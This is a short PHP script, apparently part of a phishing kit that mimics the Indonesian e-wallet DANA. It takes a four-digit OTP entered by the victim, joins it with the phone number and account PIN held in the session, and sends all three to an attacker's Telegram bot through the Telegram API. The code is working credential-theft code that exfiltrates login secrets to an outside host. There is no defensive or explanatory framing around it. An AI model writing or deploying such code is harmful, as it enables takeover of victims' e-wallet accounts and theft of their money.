<?php

session_start();
include "tele.php";

$otp1 = $_POST['otp1'];
$otp2 = $_POST['otp2'];
$otp3 = $_POST['otp3'];
$otp4 = $_POST['otp4'];
$otp = $otp1.$otp2.$otp3.$otp4;
$nohp        = $_SESSION['nohp'];
$pin                = $_SESSION['acc_pin'];

$message = "
──────────────────────
DANA | AKUN | ".$nohp."
──────────────────────
• No HP     : ".$nohp."
• Pin       : ".$pin."
• Otp       : ".$otp."
──────────────────────";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $message, $id_bot);
// header('Location: ./../dana_pin/');
?>